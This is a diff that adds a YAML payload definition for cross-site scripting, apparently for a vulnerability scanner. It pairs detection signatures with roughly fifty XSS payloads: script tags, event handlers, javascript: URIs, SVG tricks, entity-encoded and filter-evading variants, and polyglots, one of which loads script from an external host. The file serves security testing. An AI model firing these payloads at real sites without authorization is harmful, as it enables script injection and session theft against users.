@@ -1,0 +1,79 @@
+name: Cross-Site Scripting (XSS)
+type: xss
+description: "XSS test payloads — script tags, event handlers, javascript:, SVG-based, HTML entities bypass, polyglots"
+detection: "echo-based — payload must appear unescaped in response"
+signatures:
+  - "<script"
+  - "javascript:"
+  - "onerror="
+  - "onload="
+  - "alert("
+  - "confirm("
+  - "prompt("
+  - "<img"
+  - "document.cookie"
+  - "document.domain"
+payloads:
+  # --- Классические script-теги ---
+  - "<script>alert(1)</script>"
+  - "<script>alert('XSS')</script>"
+  - "<SCRIPT>alert(1)</SCRIPT>"
+  - "<script/src=//xss.rocks/xss.js>"
+  - "<script>alert(document.cookie)</script>"
+  - "<script>alert(document.domain)</script>"
+
+  # --- Event handlers ---
+  - "<img src=x onerror=alert(1)>"
+  - "<img src=x onerror=alert('XSS')>"
+  - "<img src=1 onerror=alert(1) />"
+  - "<body onload=alert(1)>"
+  - "<svg onload=alert(1)>"
+  - "<input autofocus onfocus=alert(1)>"
+  - "<select autofocus onfocus=alert(1)>"
+  - "<textarea autofocus onfocus=alert(1)>"
+  - "<keygen autofocus onfocus=alert(1)>"
+  - "<video><source onerror=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+  - "<marquee onstart=alert(1)>"
+
+  # --- javascript: схема ---
+  - "javascript:alert(1)"
+  - "javascript:alert('XSS')"
+  - "javascript:void(alert(1))"
+  - "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)"
+  - "jAvAsCrIpT:alert(1)"
+  - "java&#x09;script:alert(1)"
+  - "java\nscript:alert(1)"
+
+  # --- SVG-based ---
+  - "<svg><script>alert(1)</script></svg>"
+  - "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
+  - "<svg><animate onbegin=alert(1) attributeName=x></svg>"
+  - "<svg><set onbegin=alert(1) attributeName=x></svg>"
+  - "<svg/onload=alert(1)>"
+
+  # --- HTML5-теги ---
+  - "<math><mtext></mtext><mglyph><svg><mtext></mtext><animatetransform onbegin=alert(1)></svg></mglyph></math>"
+  - "<audio src=x onerror=alert(1)>"
+  - "<object data='javascript:alert(1)'>"
+  - "<iframe src='javascript:alert(1)'>"
+  - "<iframe onload=alert(1) src='about:blank'>"
+  - "<embed src='javascript:alert(1)'>"
+
+  # --- HTML entities bypass ---
+  - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
+  - "<a href='&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)'>click</a>"
+
+  # --- Обход фильтров ---
+  - "<<script>alert(1);//<</script>"
+  - "</script><script>alert(1)</script>"
+  - "';alert(1);//"
+  - "\";alert(1);//"
+  - "</title><script>alert(1)</script>"
+  - "</style><script>alert(1)</script>"
+  - "<img src=\"`\" onerror=alert(1)>"
+  - "<img src=x onerror=alert`1`>"
+
+  # --- Polyglot (работает в нескольких контекстах) ---
+  - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+  - "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></script>\">'><script>alert(String.fromCharCode(88,83,83))</script>"
